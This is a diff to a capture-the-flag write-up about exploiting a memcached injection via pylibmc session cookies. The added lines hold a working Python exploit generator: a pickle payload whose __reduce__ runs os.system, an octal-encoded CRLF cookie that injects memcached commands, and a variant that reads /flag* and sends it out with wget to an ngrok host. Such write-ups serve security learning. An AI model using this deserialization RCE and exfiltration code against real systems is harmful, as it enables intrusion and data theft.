@@ -257,11 +257,42 @@ At this point, i thougt it would be a plain memcached injection but nothing. Doi
 Reading the blog, i got that we can do a memcached injection with `pylibmc` by using carriage return line breaks by encoding the payload in a special sequence that is being understood by the HTTP protocol. However, the tricky part for me was to identify where to place the payload. In the blog, the author used a cookie named `notsecret` which i wasn't sure of. After spending some more time on this, i found the author's twitter where he attached a GIF of the exploit and used it as the session cookie. 
 
 The good thing was we got the exploit code from the blog. I modified it a bit to send request to my `ngrok` server:
+```python
+import pickle
+import os
+
+class RCE:
+    def __reduce__(self):
+        cmd = ('wget https://b058-2407-d000-403-e00e-60d2-910d-df7c-df4d.ngrok-free.app',)
+        return os.system, (cmd,)
+
+def generate_exploit():
+    payload = pickle.dumps(RCE(), 0)
+    payload_size = len(payload)
+    cookie = b'137\r\nset BT_:1337 0 2592000 '
+    cookie += str.encode(str(payload_size))
+    cookie += str.encode('\r\n')
+    cookie += payload
+    cookie += str.encode('\r\n')
+    cookie += str.encode('get BT_:1337')
+
+    pack = ''
+    for x in list(cookie):
+        if x > 64:
+            pack += oct(x).replace("0o","\\")
+        elif x < 8:
+            pack += oct(x).replace("0o","\\00")
+        else:
+            pack += oct(x).replace("0o","\\0")
+
+    return f"\"{pack}\""
+
+if __name__ == "__main__":
+    print(generate_exploit())
+```
 
 The payload i got looked something like this: 
-```
-"\061\063\067\015\012\163\145\164\040\102\124\137\072\061\063\063\067\040\060\040\062\065\071\062\060\060\060\040\061\060\060\015\012\143\156\164\012\163\171\163\164\145\155\012\160\060\012\050\126\167\147\145\164\040\150\164\164\160\163\072\057\057\142\060\065\070\055\062\064\060\067\055\144\060\060\060\055\064\060\063\055\145\060\060\145\055\066\060\144\062\055\071\061\060\144\055\144\146\067\143\055\144\146\064\144\056\156\147\162\157\153\055\146\162\145\145\056\141\160\160\012\160\061\012\164\160\062\012\122\160\063\012\056\015\012\147\145\164\040\102\124\137\072\061\063\063\067"
-```
+![image](https://github.com/hash3liZer/khatta/assets/29171692/b55a7d35-80e4-47d0-9283-1d92ec0b0a08)
 
 As per the HTTP specs, we need send it with double quotes as the session cookie. I used burp: 
 ```
@@ -287,6 +318,12 @@ At first it returned me a `200` response. While i should have gotten an `Interna
 ![image](https://github.com/hash3liZer/khatta/assets/29171692/5df209cf-3e5f-4a0a-ae0b-45bc7657993c)
 
 So, i modified the exploit a bit to get the flag: 
+```python
+class RCE:
+    def __reduce__(self):
+        cmd = ('wget "https://b058-2407-d000-403-e00e-60d2-910d-df7c-df4d.ngrok-free.app$(cat /flag*)"',)
+        return os.system, (cmd,)
+```
 
 I sent the request second and got the response on terminal: 
 ```
